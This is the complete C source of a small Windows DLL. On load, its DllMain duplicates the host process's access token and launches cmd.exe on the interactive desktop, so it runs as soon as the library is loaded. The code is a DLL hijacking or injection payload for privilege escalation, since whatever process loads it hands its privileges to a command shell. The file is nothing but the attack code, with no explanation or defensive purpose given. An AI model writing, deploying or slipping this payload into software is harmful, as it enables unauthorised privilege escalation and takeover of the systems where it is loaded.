#include <Windows.h>

void HijackSession()
{
	HANDLE hToken = INVALID_HANDLE_VALUE;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) {
		HANDLE hDupe = INVALID_HANDLE_VALUE;
		if (DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hDupe)) {
			STARTUPINFO si = { 0 };
			PROCESS_INFORMATION pi = { 0 };
			si.cb = sizeof(STARTUPINFO);
			si.lpDesktop = (LPWSTR)L"winsta0\\Default";
			CreateProcessWithTokenW(hDupe, LOGON_NETCREDENTIALS_ONLY, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &si, &pi);
		}
	}
}

BOOL WINAPI DllMain(HMODULE hMod, DWORD dwReason, LPVOID lpvReserved)
{
	if (dwReason == DLL_PROCESS_ATTACH) {
		DisableThreadLibraryCalls(hMod);
		HijackSession();
	}

	return FALSE;
}